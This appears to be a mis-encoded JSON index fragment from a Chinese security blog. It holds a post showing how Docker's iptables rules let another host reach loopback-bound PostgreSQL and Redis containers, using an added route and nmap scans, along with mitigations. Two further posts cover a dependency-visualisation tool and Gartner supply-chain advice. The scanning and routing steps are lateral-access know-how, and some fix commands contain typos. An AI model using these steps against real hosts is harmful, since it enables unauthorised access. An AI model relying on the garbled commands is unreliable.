docker -v\nDocker version 20.10.7, build f0df350\nåˆ›å»ºdockerå®¹å™¨å¹¶å°†æœåŠ¡æ˜ å°„åˆ°æœ¬åœ°ç•¥-å·²æœ‰æ»¡è¶³æµ‹è¯•è¦æ±‚çš„å®¹å™¨æœåŠ¡# æŸ¥çœ‹dockeræš´éœ²æœåŠ¡åˆ—è¡¨,å…¶ä¸­5432å’Œ6379ç»‘å®šæœ¬åœ°å›ç¯åœ°å€\n[root@tvy-base-worker-03 ~]# netstat -nlp |grep docker-proxy|awk &#39;&#123;print $4&#125;&#39;|sort\n0.0.0.0:8000\n0.0.0.0:9000\n127.0.0.1:5432\n127.0.0.1:6379\n# æŸ¥çœ‹iptablesé…ç½®\n[root@tvy-base-worker-03 ~]# iptables -nvL DOCKER\nChain DOCKER (2 references)\n pkts bytes target     prot opt in     out     source               destination\n    2    96 ACCEPT     tcp  --  !br-155dee3a3330 br-155dee3a3330  0.0.0.0&#x2F;0            172.21.0.2           tcp dpt:6379\n    2    88 ACCEPT     tcp  --  !br-155dee3a3330 br-155dee3a3330  0.0.0.0&#x2F;0            172.21.0.3           tcp dpt:5432\n 1082 69248 ACCEPT     tcp  --  !br-155dee3a3330 br-155dee3a3330  0.0.0.0&#x2F;0            172.21.0.4           tcp dpt:8000\n  171 10916 ACCEPT     tcp  --  !docker0 docker0  0.0.0.0&#x2F;0            172.17.0.2           tcp dpt:9000\nattack æµ‹è¯•# æœªåšä»»ä½•é…ç½®ï¼Œæ— æ³•è®¿é—®\n[root@tvy-base-worker-01 ~]# telnet 172.21.0.2 6379\nTrying 172.21.0.2...\nConnected to 172.21.0.2.\nEscape character is &#39;^]&#39;.\n# æ·»åŠ è·¯ç”±è¡¨ï¼Œå¯æ·»åŠ ç½‘å…³åœ°å€\n[root@tvy-base-worker-01 ~]# ip route add 172.21.0.0&#x2F;24 via 10.1.82.97\n# æ‰«æå®¹å™¨ç«¯å£æœåŠ¡\n[root@tvy-base-worker-01 ~]# nmap -p5432 -Pn --open 172.21.0.0&#x2F;24\n\nStarting Nmap 6.40 ( http:&#x2F;&#x2F;nmap.org ) at 2022-08-05 10:22 CST\nNmap scan report for 172.21.0.3\nHost is up (0.00018s latency).\nPORT     STATE SERVICE\n5432&#x2F;tcp open  postgresql\n\nNmap done: 256 IP addresses (256 hosts up) scanned in 4.84 seconds\n[root@tvy-base-worker-01 ~]# nmap -p6379 -Pn --open 172.21.0.0&#x2F;24\n\nStarting Nmap 6.40 ( http:&#x2F;&#x2F;nmap.org ) at 2022-08-05 10:22 CST\nNmap scan report for 172.21.0.2\nHost is up (0.00025s latency).\nPORT     STATE SERVICE\n6379&#x2F;tcp open  unknown\n\nNmap done: 256 IP addresses (256 hosts up) scanned in 4.84 seconds\n# åˆ é™¤IP route\n[root@tvy-base-worker-01 ~]# ip route del 172.21.0.0&#x2F;24 via 10.1.82.97\n\næ¼æ´åˆ†æé»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker deamonä¼šåœ¨å¯åŠ¨containerçš„æ—¶å€™å‘iptablesä¸­æ·»åŠ è½¬å‘çš„è§„åˆ™ã€‚å®ƒä¼šåˆ›å»ºä¸€ä¸ªfilter chain - DOCKERã€‚å¹¶ä¸”é˜²ç«å¢™ä¹Ÿæ²¡æœ‰è®°å½•ã€‚\nfirewall-cmdÂ --list-port  \nfirewall-cmdÂ --list-service\n\n\ndockeåˆ©ç”¨è¿™ä¸ªè§„åˆ™å‘å¤–æš´éœ²containerçš„ç«¯å£ã€‚ä»ä¸Šå›¾å¯è§ï¼Œç”±äºsourceä¸º0.0.0.0ï¼Œè¡¨ç¤ºä»»ä½•ipéƒ½å¯ä»¥åŒ¹é…è¿™æ¡è§„åˆ™ï¼Œå› æ­¤ä¹Ÿå°±å°†è¿™ä¸ªç«¯å£æš´éœ²ç»™äº†å…¨ä¸–ç•Œã€‚åªè¦å¤–éƒ¨æ”»å‡»è€…é€šè¿‡è¿™å°ä¸»æœºå°†æµé‡å‘é€åˆ° 172.21.0.3:5432ï¼Œå°±ä¼šåŒ¹é…è¿™æ¡è§„åˆ™å¹¶æˆåŠŸè®¿é—®å®¹å™¨ä¸­çš„postgresqlæœåŠ¡ï¼Œ127.0.0.1 å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚\nä¿®å¤æ–¹å¼å®˜æ–¹æš‚æœªä¿®å¤è¯¥æ¼æ´ï¼Œå¯é‡‡å–ä¸´æ—¶ä¿®å¤æªæ–½å¯åŠ¨daemonçš„æ—¶å€™ä½¿ç”¨å¦‚ä¸‹çš„é…ç½®ï¼š--iptables=falseå¯¹äºsystemdï¼Œä¸´æ—¶ä¿®å¤æ–¹å¼å¦‚ä¸‹ï¼š\nmkdir&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d\ncat &lt;&lt; EOF &gt; &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d&#x2F;noiptables.conf\n[Service]\nExecStart&#x3D;\nExecStart&#x3D;&#x2F;us&#x2F;bin&#x2F;docker daemon -H fd:&#x2F;&#x2F;-- iptables&#x3D;false\nEOF\nsystemctl daemon-reload\n\nå¯¹äºä½¿ç”¨sysvinitå’Œupstartçš„ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹dockerçš„é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;default&#x2F;dockerã€‚\n#Â å…ˆåœæ­¢docker  \nsystemclÂ stopÂ docker  \n#Â ä¿®æ”¹é…ç½®Â   \nvimÂ &#x2F;etc&#x2F;docker&#x2F;daemon.json\n#Â å¦‚ä»¥ä¸‹å†…å®¹ç²˜è´´è¿›å»  \n&#123;  \n&quot;iptables&quot;:false  \n&#125;\n#Â ä¿å­˜é…ç½®åï¼Œé‡å¯docker  \nsystemctlÂ restartÂ docker\nReferencesiptablesè¯¦è§£åŠdockerçš„iptablesè§„åˆ™_æ‘©æ´›å“¥Mçš„åšå®¢-CSDNåšå®¢_docker iptableshttps://www.jianshu.com/p/69d3ab177655https://mp.weixin.qq.com/s/OwEmhmsnuwsCjqcczPztQAip routeå‘½ä»¤ - sudochen - åšå®¢å›­\n","slug":"Dockeré…ç½®å®‰å…¨ç½‘ç»œè®¿é—®æ§åˆ¶","date":"2022-08-05T02:47:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"Dockerç½‘ç»œ,å®¹å™¨å®‰å…¨","author_index":"Moses"},{"id":"f2412a8bd3bfecd60141b4e2ac30134b","title":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æå·¥å…·-V-Achilles","content":"å·¥å…·-ä¾èµ–å…³ç³»å›¾V-Achillesç®€ä»‹V-Achillesæ˜¯ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥æ˜¾ç¤ºå—è½¯ä»¶æ¼æ´æ”»å‡»å½±å“çš„ç›´æ¥å’Œé—´æ¥ä¾èµ–é¡¹çš„å¯è§†åŒ–ï¼ˆå³ä½¿ç”¨ä¾èµ–å…³ç³»å›¾ï¼‰ã€‚æ¼”ç¤ºåœ°å€ï¼šAchilles\n4ä¸ªGitHubå­˜å‚¨åº“çš„æ¼æ´æŠ¥å‘Š\nsinopiaï¼šæŠ¥å‘Š\ncpnmjsï¼šæŠ¥å‘Š\nwindow-build-toolï¼šæŠ¥å‘Š\nnpxï¼šæŠ¥å‘Š\n\nå®‰è£…æŒ‡å—å‰ç«¯# Local Commands\n\nyarn install yarn start\n\n# Docker commands\n\ndocker-compose up -d --build\n\n# After running commands successfully, the app will be run onÂ http:&#x2F;&#x2F;localhost:3000&#x2F;\n\nåç«¯# Local Commands\n\nyarn installÂ yarn buildÂ yarn start\n\n# Docker commands\n\ndocker-compose up -d --build\n\n# After running commands successfully, the app will be run onÂ http:&#x2F;&#x2F;localhost:4000&#x2F;\n","slug":"å·¥å…·-ä¾èµ–å…³ç³»å›¾V-Achilles","date":"2022-08-02T03:17:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·,è½¯ä»¶ä¾èµ–å…³ç³»å›¾","author_index":"Moses"},{"id":"a83b1803a62789ff520605e269e53d45","title":"è½¯ä»¶å·¥ç¨‹é¢†å¯¼è€…å¦‚ä½•é™ä½è½¯ä»¶ä¾›åº”é“¾é£é™©","content":"æ¦‚è¿°å’ŒèƒŒæ™¯è°ƒç ”å…³é”®å‘ç°å…±åˆ†ä¸ºä»¥ä¸‹ä¸‰ç‚¹ï¼šÂ \n\næ¶æ„ä»£ç æ³¨å…¥å¨èƒçš„å¢åŠ ä½¿å¾—ä¿æŠ¤å†…éƒ¨ä»£ç å’Œå¤–éƒ¨ä¾èµ–é¡¹ï¼ˆå¼€æºå’Œå•†ä¸šï¼‰å˜å¾—è‡³å…³é‡è¦ã€‚Â \nè½¯ä»¶æ„å»ºå’Œäº¤ä»˜æµç¨‹å—åˆ°ç ´åçš„åå°†å¯¼è‡´æ³„éœ²æœºå¯†æˆ–å…¶ä»–æ•æ„Ÿæ•°æ®å’Œä»£ç è¢«ç¯¡æ”¹ã€‚Â \næœªèƒ½å¼ºåˆ¶æ‰§è¡Œæœ€ä½æƒé™å’Œæ‰å¹³åŒ–ç½‘ç»œæ¶æ„ï¼ˆå¯¹åº”çš„æ˜¯åˆ†å±‚ç½‘ç»œæ¶æ„æˆ–éš”ç¦»ç½‘ç»œï¼‰ä¼šä½¿æ”»å‡»è€…æ¨ªå‘ç§»åŠ¨åˆ°ç”Ÿäº§ç¯å¢ƒï¼Œä»è€Œä½¿ä¼ä¸šé¢ä¸´æ›´å¤§çš„é£é™©ã€‚\n\næ ¹æ®å…³é”®å‘ç°ï¼Œè°ƒç ”ç»™å‡ºä»¥ä¸‹å»ºè®®ï¼Œè½¯ä»¶å·¥ç¨‹é¢†å¯¼è€…åº”è¯¥ä¸ä»–ä»¬çš„å®‰å…¨å’Œé£é™©ç®¡ç†å›¢é˜Ÿåˆä½œï¼Œå…·ä½“åˆ†ä¸ºä»¥ä¸‹ä¸‰ç‚¹ï¼š\n\nåœ¨æ•´ä¸ªäº¤ä»˜ç”Ÿå‘½å‘¨æœŸä¸­ï¼Œé€šè¿‡å¼ºåˆ¶æ‰§è¡Œå¥å…¨çš„ç‰ˆæœ¬æ§åˆ¶ç­–ç•¥ã€ä½¿ç”¨åˆ¶å“åº“æ¥å­˜å‚¨å—ä¿¡ä»»çš„ç»„ä»¶ä»¥åŠç®¡ç†ä¾›åº”å•†é£é™©ï¼Œè¿›è€Œæ¥ä¿æŠ¤å†…éƒ¨å’Œå¤–éƒ¨ä»£ç çš„å®Œæ•´æ€§ã€‚\né€šè¿‡åœ¨ CI&#x2F;CD ä¸­é…ç½®å®‰å…¨å·¥å…·ï¼Œä¿æŠ¤æœºå¯†ä»¥åŠä»£ç å’Œå¯¹å®¹å™¨é•œåƒç­¾åï¼Œæœ€ç»ˆæ¥å¼ºåŒ–è½¯ä»¶äº¤ä»˜ç®¡é“æµç¨‹ã€‚\né€šè¿‡ä½¿ç”¨æœ€å°ç‰¹æƒåŸåˆ™å’Œé›¶ä¿¡ä»»å®‰å…¨æ¨¡å‹æ¥ç®¡ç†èµ„æºçš„è®¿é—®ï¼Œä¿æŠ¤è½¯ä»¶å·¥ç¨‹å¸ˆçš„æ“ä½œç¯å¢ƒã€‚\n\nå®¢æˆ·å…³æ³¨çš„ä¾›åº”é“¾é£é™©ç»´åº¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç‚¹ï¼š\n\nCI&#x2F;CDç³»ç»Ÿçš„å¨èƒ\næ¶æ„ä»£ç æ³¨å…¥é£é™©\nåŒ…å«æ¼æ´å’Œæ¶æ„ä»£ç çš„ä¾èµ–é¡¹\n\n\n\n\n\n\n\n\n\n\nä»SolarWinds (2020)ã€NetBeans IDE (2020)ã€Kaseya (2021) å’Œ Codecov (2021)ä»£è¡¨è½¯ä»¶ä¾›åº”é“¾æ”»å‡»çš„è¿™å››ä¸ªçªå‡ºç¤ºä¾‹æ¥çœ‹ã€‚Gartner è®¤ä¸ºï¼Œåˆ° 2025 å¹´ï¼Œå…¨çƒ 45% çš„ç»„ç»‡å°†å—åˆ°è½¯ä»¶ä¾›åº”é“¾é­å—æ”»å‡»ï¼Œæ¯” 2021 å¹´å¢åŠ äº†ä¸‰å€ã€‚\næ½œåœ¨è½¯ä»¶ä¾›åº”é“¾é£é™©è½¯ä»¶ä¾›åº”é“¾æ”»å‡»æ˜¯åœ¨è½¯ä»¶å¼€å‘ã€äº¤ä»˜å’Œä½¿ç”¨çš„ä»»ä½•é˜¶æ®µç ´åè½¯ä»¶æˆ–å…¶ä¾èµ–é¡¹ä¹‹ä¸€çš„è¡Œä¸ºã€‚ å°½ç®¡æ¯ç§æƒ…å†µä¸‹ç²¾ç¡®çš„æ”»å‡»å‘é‡å¯èƒ½ä¸åŒï¼Œä½†æ”»å‡»è€…é€šå¸¸ä¼šæœªæˆæƒè®¿é—®å¼€å‘ç¯å¢ƒå’ŒåŸºç¡€è®¾æ–½ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€åˆ¶å“ä»“åº“ã€å¼€æºè½¯ä»¶å­˜å‚¨åº“ã€æŒç»­é›†æˆç®¡é“ã€æ„å»ºæœåŠ¡å™¨æˆ–åº”ç”¨ç¨‹åºæœåŠ¡å™¨ç­‰ï¼Œè¿™å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹æºä»£ç ã€è„šæœ¬å’Œä¾èµ–è½¯ä»¶åŒ…ï¼Œå¹¶å»ºç«‹åé—¨çªƒå–å—å®³è€…ç¯å¢ƒä¸­çš„æ•°æ®ã€‚æ”»å‡»åŒ…æ‹¬ä½†ä¸ä»…é™äºå¤–éƒ¨æ”»å‡»è€…ï¼Œä¹Ÿå¯èƒ½æ¥è‡ªå†…éƒ¨å¨èƒã€‚\nå†…éƒ¨å’Œå¤–éƒ¨ä»£ç é£é™©ï¼ˆå¼€æºç»„ä»¶ï¼‰å¼€å‘é˜¶æ®µ\nè¯ä¹¦ä¸¢å¤±\nå¯†é’¥ç¡¬ç¼–ç \nå¯†é’¥ä¸¢å¤±\nå¼±åŠ å¯†\nä»£ç æ³¨å…¥\nå›ºä»¶ä¸²æ”¹\n\né›†æˆé˜¶æ®µ\nå¼€æºç»„ä»¶æ¼æ´\nåŒ…åæŠ¢æ³¨\nå‘½åç©ºé—´å†²çª\nä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹SDKå’ŒAPI\n\näº¤ä»˜æµç¨‹é£é™©\nç­¾åè¯ä¹¦è¢«ç¯¡æ”¹\nè‡ªåŠ¨åŒ–è„šæœ¬è¢«ç¯¡æ”¹\n\nç”Ÿäº§ç¯å¢ƒé£é™©\næœªæˆæƒè®¿é—®\näºŒè¿›åˆ¶ä»£ç é€†å‘\nè¡¨å•åŠ«æŒ\nææƒ\nç½‘ç»œç«¯å£æ‰«æ\næ›´æ–°åŠ«æŒ\n\nè½¯ä»¶å¼€å‘å’Œéƒ¨ç½²ä¸­é™ä½ä¾›åº”é“¾å®‰å…¨é£é™©çš„æœ€ä½³å®‰å…¨å¼€å‘å®è·µé’ˆå¯¹è¿™ä¸‰ç±»é£é™©ï¼ŒGartnerç»™å‡ºäº†éƒ¨åˆ†åº”å¯¹æªæ–½å’Œå»ºè®®ã€‚\nå†…éƒ¨å’Œå¤–éƒ¨ä»£ç é£é™©åº”å¯¹æªæ–½è½¯ä»¶ç ”å‘å›¢é˜Ÿä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆgit&#x2F;svnç­‰ï¼‰å’Œåˆ¶å“åº“æ¥ç»´æŠ¤å†…éƒ¨ä»£ç å¼€å‘å’Œå¤–éƒ¨åˆ¶å“åˆ†å‘ï¼Œå¦‚æœæœªå°†è¿™äº›ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿå’Œåˆ¶å“åº“è¿›è¡Œå®‰å…¨æ§åˆ¶ï¼Œå¯å¯¼è‡´æºä»£ç å’Œç»„ä»¶è¢«ç¯¡æ”¹æˆ–åŠ«æŒã€‚Garteræ¨èä»¥ä¸‹ä¸‰ç§æ–¹å¼æ¥ä¿éšœä»£ç å’Œç»„ä»¶çš„å®Œæ•´æ€§ã€‚\n\nä¸¥æ ¼çš„ç‰ˆæœ¬æ§åˆ¶\nå—ä¿¡ä»»çš„ç»„ä»¶åº“\nç¬¬ä¸‰æ–¹é£é™©ç®¡ç†\n\nä¸¥æ ¼çš„ç‰ˆæœ¬æ§åˆ¶åŸºäº Git çš„ç‰ˆæœ¬ç®¡ç†ç³»ç»Ÿï¼ˆVCSï¼‰ï¼ŒåŒ…æ‹¬ BitBucketã€GitHub å’Œ GitLabï¼Œæä¾›æºä»£ç æ‰˜ç®¡å’Œè®¿é—®æƒé™æ§åˆ¶èƒ½åŠ›ï¼Œè½¯ä»¶å·¥ç¨‹å›¢é˜Ÿå¿…é¡»å¯ç”¨è®¿é—®ç­–ç•¥æ§åˆ¶ã€åˆ†æ”¯ä¿æŠ¤å’Œæ•æ„Ÿæ‰«æåŠŸèƒ½ã€‚ è¿™äº›æ§ä»¶ç­–ç•¥é»˜è®¤æƒ…å†µä¸‹ä¸å¯ç”¨ï¼Œå¿…é¡»è¿›è¡Œé…ç½®ã€‚ç”±äºéƒ¨åˆ†ç ”å‘äººå‘˜å®‰å…¨æ„æ€å­±å¼±ï¼Œæ— æ„å°†å¯†é’¥ä¿¡æ¯ï¼Œè¯ä¹¦ç­‰ä¸Šä¼ åˆ°githubæˆ–è€…gitlabä¸Šï¼Œä»»ä½•èƒ½è®¿é—®åˆ°æºä»£ç çš„ç”¨æˆ·å‡å¯è·å–ç›¸å…³æ•æ„Ÿä¿¡æ¯,Garteræ¨èéƒ¨åˆ†åŸºäºGitå­˜å‚¨åº“çš„æ•æ„Ÿä¿¡æ¯æ‰«æå·¥å…·ã€‚\n\n\n\nå¼€æºå·¥å…·\nå‚å•†\n\n\n\ngit-secrets: Open sourced by AWS Labs\nGithub Secrets Scanning\n\n\nRepo Supervisor: Open sourced by Auth0\nGitLab Secret Detection\n\n\ntruffleHog: Searches for secrets in Git repos\nBitbuchet Secrets Scan\n\n\nGitleaks: Scans repos and commits for secrets\nGitGuardian\n\n\nDeadshot: Open sourced by Twilio\nSpectralOps\n\n\nå—ä¿¡ä»»çš„ç»„ä»¶åº“å»ºè®®ä½¿ç”¨åˆ¶å“ï¼ˆæˆ–å®¹å™¨é•œåƒï¼‰å­˜å‚¨åº“ã€è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·å’Œæºä»£ç æ‰«æå·¥å…·ï¼Œå…¶ä¸­åˆ¶å“å­˜å‚¨åº“å¯ä»¥å¯¹ç»„ä»¶è¿›è¡Œåˆ†å‘ç‰ˆæœ¬æ§åˆ¶ï¼Œè½¯ä»¶æˆåˆ†åˆ†æå·¥å…·ï¼ˆSCAï¼‰å¯ä»¥å¯¹å½“å‰ç»„ä»¶åŠæºä»£ç è¿›è¡Œæˆåˆ†åˆ†æï¼Œè·å–é¡¹ç›®çš„ä¾èµ–é£é™©ä¿¡æ¯ï¼Œå¹¶åŠæ—¶è¿›è¡Œå‡çº§ä¿®å¤ï¼Œå¯¹äºæºä»£ç æ‰«æå·¥å…·(SAST)ï¼Œå¯ä»¥å¯¹ç”¨æˆ·è‡ªå·±ç¼–å†™çš„æºä»£ç è¿›è¡Œåˆè§„å’Œå®‰å…¨è¡Œåˆ†æã€‚å¸¸è§çš„åˆ¶å“åº“ç®¡ç†å·¥å…·å¦‚ä¸‹ï¼š\n\n\n\nç»„ä»¶ç®¡ç†å¹³å°\nå®¹å™¨ç®¡ç†å¹³å°\n\n\n\nAzure Artifacts\nAzure Container Registry\n\n\nAWS CodeArtifacts\nAmazon ECR\n\n\nGitHub\nCNCF Harbor\n\n\nGitLab\nDocker Trusted Registry\n\n\nGoogle Artifact Registry\nGitHub\n\n\nJFrog Artifactory\nGitLab\n\n\nSonatype Nexus Repository\nGoogle Container Registry\n\n\nTidelift Catalogs\nJFrog Artifactory\n\n\nRed Hat Quay\n\n\n\nå¸¸ç”¨ä¼ä¸šçº§çš„SASTå·¥å…·å¦‚ä¸‹ï¼š\n\n\n\nå·¥å…·åç§°\nç±»å‹\nå…¬å¸\nåœ°å€\n\n\n\nFortify sca\nå•†ä¸š\nHp Security\nhttps://www.microfocus.com/zh-cn/products/static-code-analysis-sast/overview\n\n\ncheckmarx sast\nå•†ä¸š\ncheckmarx\nhttps://checkmarx.com/product/cxsast-source-code-scanning/\n\n\nSonarqube\nå¼€æº\nSonaqube\nhttps://www.sonarqube.org/\n\n\nVeracode Static Analysis (SAST)\nå•†ä¸š\nVeracode\nhttps://www.veracode.com/products/binary-static-analysis-sast\n\n\nCoverity\nå•†ä¸š\nsynopsys\nhttps://www.synopsys.com/software-integrity/security-testing/static-analysis-sast.html\n\n\nå¥‡å®‰ä¿¡ä»£ç å«å£«\nå•†ä¸š\nqax\nhttps://www.qianxin.com/product/detail/pid/14\n\n\nDMSCA\nå•†ä¸š\nç«¯ç›ç§‘æŠ€\nhttp://www.dumasecurity.com/goods.html\n\n\nAppScan Source\nå•†ä¸š\nHCL AppScan\nhttps://www.hcltechsw.com/appscan/offerings/source\n\n\nå¸¸ç”¨ä¼ä¸šçº§SCAå·¥å…·ï¼š\n\n\n\nå·¥å…·åç§°\nç±»å‹\nå…¬å¸\nåœ°å€\n\n\n\nBlack Duck Software Composition Analysis\nå•†ä¸š\nsynopsys\nhttps://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html\n\n\nnexus lifecycle\nå•†ä¸š\nSonatype\nhttps://www.sonatype.com/products/open-source-security-dependency-management?topnav=true\n\n\nVeracode sca\nå•†ä¸š\nVeracode\nhttps://www.veracode.com/products/software-composition-analysis\n\n\nJfrog Xray\nå•†ä¸š\nJfrog\nhttps://jfrog.com/xray/\n\n\nMend sca\nå•†ä¸š\nMend\nhttps://www.mend.io/sca/\n\n\ncheckmarx sca\nå•†ä¸š\nCheckmarx\nhttps://checkmarx.com/product/cxsca-open-source-scanning/\n\n\nDependency Scanning\nå•†ä¸š\nGitlab\nhttps://docs.gitlab.com/ee/user/application_security/dependency_scanning/\n\n\nDependency Track\nå¼€æº\nOwasp\nhttps://dependencytrack.org/\n\n\né›³é‰´SCA\nå•†ä¸š\né»˜å®‰\nhttps://www.moresec.cn/product/sdl-sca\n\n\næ‚¬é•œæºé‰´OSS\nå•†ä¸š\næ‚¬é•œ\nhttps://oss.xmirror.cn/\n\n\nCoBot\nå•†ä¸š\nåŒ—å¤§åº“åš\nhttps://www.pkuse.com.cn/multi/521.html\n\n\nThe Forrester Wave SCA\n\n\n\n\n\n\n\n\n\n\n\nTOP 10 SCAå·¥å…·ä¸­æœ‰5æ¬¾æ”¯æŒè½¯ä»¶åŒ…å¼€æºè½¯ä»¶SCAæ£€æŸ¥èƒ½åŠ›(synopsys&#x2F; Sonatype&#x2F; Veracode&#x2F; Jfrog&#x2F; GitLab)ï¼Œå…¶ä»–å·¥å…·åªæ”¯æŒæºä»£ç SCAæ£€æŸ¥èƒ½åŠ›ã€‚5æ¬¾æ”¯æŒè½¯ä»¶åŒ…SCAæ£€æŸ¥å·¥å…·ä¸­ï¼Œå¯¹C&#x2F;C++ã€Javaã€.Netè¯­è¨€æ”¯æŒçš„æ¯”è¾ƒå¥½ï¼Œä½†å¯¹Golangã€pythonã€JavaScriptè¯­è¨€æ”¯æŒèƒ½åŠ›åå¼±ï¼Œæ¯”å¦‚ï¼šsynopsysæ”¯æŒçš„ç»„ä»¶å¯¹è±¡ä¸­å‰é¢3ç§è¯­è¨€å å¤§å¤´90%+ï¼Œç›¸åº”çš„æ£€æµ‹ç‡ä¹Ÿé«˜ï¼Œè€ŒGolangè¯­è¨€çš„ç»„ä»¶æ£€å‡ºç‡åˆ™ä½å¾ˆå¤šã€‚\nç¬¬ä¸‰æ–¹é£é™©ç®¡ç†å¸¸è§çš„ä¸ç¬¬ä¸‰æ–¹è½¯ä»¶ç›¸å…³çš„ä¸¤ç§ä¾›åº”é“¾é£é™©ï¼š\n\nç”±äºç¬¬ä¸‰æ–¹æˆ–å¼€æºä¾èµ–é¡¹ä¸­çš„å·²çŸ¥æ¼æ´è€Œå¯¼è‡´çš„é£é™©\nç”±äºå¤–éƒ¨é‡‡è´­è½¯ä»¶ä¸­æ¤å…¥åé—¨&#x2F;æ¶æ„è½¯ä»¶çš„é£é™©\n\nGarteræä¾›çš„è§£å†³æªæ–½ï¼š\n\næ£€æŸ¥ç¬¬ä¸‰æ–¹æ˜¯å¦éµå¾ªæ ‡å‡†æˆ–è·å¾—è®¤è¯\næ£€æŸ¥ä¾›åº”å•†æ˜¯å¦æœ‰å¿…è¦çš„æªæ–½å¼€å±•SDLCæµç¨‹\nä¾›åº”å•†éµå¾ªä»€ä¹ˆæµç¨‹æ¥ä¿®è¡¥è‡ªå·±çš„è½¯ä»¶åŠå…¶ä¾èµ–é¡¹\nç¬¬ä¸‰æ–¹è½¯ä»¶çš„æ›´æ–°æœºåˆ¶æ˜¯å¦å—åˆ°ä¿æŠ¤\nå¯¹äºç¬¬ä¸‰æ–¹è½¯ä»¶æˆ–ä¾èµ–é¡¹ä¸­å‘ç°çš„æ¼æ´çš„SLAï¼ˆè½¯ä»¶æœåŠ¡åè®®ï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ\n\nè½¯ä»¶ä¾›åº”é“¾å®‰å…¨è¯„ä¼°æ¡†æ¶å’Œæ ‡å‡†\n\n\n\nè¯„ä¼°åç§°\nç®€ä»‹\nåœ°å€\n\n\n\nEvaluating Your Supply Chain Security\nA Checklist by Cloud Native Computing Foundation (CNCF)\nhttps://github.com/cncf/tag-security/blob/main/supply-chain-security/supply-chain-security-paper/secure-supply-chain-assessment.md\n\n\nNIST Secure Software Development Framework\nSecure Software Development Framework (SSDF) Version 1.1:Recommendations for Mitigating the Risk of SoftwareVulnerabilities\nhttps://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf\n\n\nNIST, Security and Privacy Controls for Information Systems and Organizations\nSecurity and Privacy Controls.\nhttps://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf\n\n\nUl 2900 for IoT Certification\nUL 2900 series of standards was developed as part of ULâ€™s Cybersecurity Assurance Program which provides manufacturers testable and measureable criteria\nhttps://www.cybersecuritysummit.org/wp-content/uploads/2017/10/4.00-Justin-Heyl.pdf\n\n\nISO&#x2F;IEC 27034\nInformation technology â€” Security techniques â€” Application security\nhttps://www.iso.org/standard/44378.html\n\n\nè½¯ä»¶ä¾›åº”é“¾å¼€æºé¡¹ç›®å®‰å…¨è¯„ä¼°\n\n\n\nè¯„ä¼°åç§°\nç®€ä»‹\nåœ°å€\n\n\n\nOpen Source Insights\nOpen Source Insights ä¼šå±•ç¤ºè½¯ä»¶åŒ…çš„ç›¸å…³ä¿¡æ¯ï¼Œè€Œæ— éœ€ç”¨æˆ·é¢„å…ˆå®‰è£…è½¯ä»¶åŒ…ã€‚å¼€å‘äººå‘˜å¯ä»¥çœ‹åˆ°è¯¥ä¾èµ–åŒ…å¯¹é¡¹ç›®çš„é‡è¦ç¨‹åº¦ï¼Œä¾èµ–ç»„ä»¶æµè¡Œç¨‹åº¦ï¼ŒæŸ¥æ‰¾æºä»£ç çš„é“¾æ¥ï¼Œç„¶åå†³å®šæ˜¯å¦åº”å®‰è£…è¯¥ç»„ä»¶ã€‚\nhttps://opensource.googleblog.com/2021/06/introducing-open-source-insights-project.html\n\n\nOSSF Scorecard\nOSSF Scorecard æ˜¯ä¸€ä¸ªé€šè¿‡å¤šç§ç»´åº¦æ¥è¯„ä¼°å¼€æºé¡¹ç›®çš„å®‰å…¨æ€§çš„å·¥å…·.\nhttps://github.com/ossf/scorecard\n\n\nSupply chain Levels for Software Artifacts (SLSA, pronounced â€œsalsaâ€)\nç¡®ä¿è½¯ä»¶ä¾›åº”é“¾ä¸­ç»„ä»¶å®Œæ•´æ€§çš„ç«¯åˆ°ç«¯ä¿æŠ¤æ¡†æ¶ã€‚\nhttps://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html\n\n\näº¤ä»˜æµç¨‹é£é™©åº”å¯¹æªæ–½1. ä½¿ç”¨å¯†é’¥ç®¡ç†å·¥å…·:å¯†é’¥ç®¡ç†é€šè¿‡è§„èŒƒçš„æ–¹æ³•æ¥ç®¡ç†å’Œä¿æŠ¤å¦‚å‡­è¯ã€å¯†ç ã€API ä»¤ç‰Œå’Œè¯ä¹¦ç­‰æœºå¯†ã€‚ Garterå»ºè®®ä½¿ç”¨å¯†é’¥ç®¡ç†å·¥å…·æ¥è‡ªåŠ¨åˆ›å»ºã€å­˜å‚¨ã€æ£€ç´¢å’Œæ’¤é”€ç§˜å¯†ã€‚ è¿™æœ‰åŠ©äºé¿å…åœ¨æºä»£ç ã€é…ç½®æ–‡ä»¶å’ŒåŸºç¡€è®¾æ–½è‡ªåŠ¨åŒ–è„šæœ¬ä¸­åµŒå…¥ï¼ˆç¡¬ç¼–ç ï¼‰å¯†é’¥ä¿¡æ¯ç­‰ã€‚å¸¸è§çš„å¯†é’¥ç®¡ç†å·¥å…·å¦‚ä¸‹ï¼š\n\n\n\nåœºæ™¯\nå¯†é’¥ç®¡ç†å·¥å…·\n\n\n\nä¸å¹³å°æ— å…³\nAkeyless\n\n\nCyberArk Conjur\n\n\n\nThycotic Secrets Vault\n\n\n\nHashiCorp Vault\n\n\n\näº‘å‚å•†æä¾›\nAWS Secrets 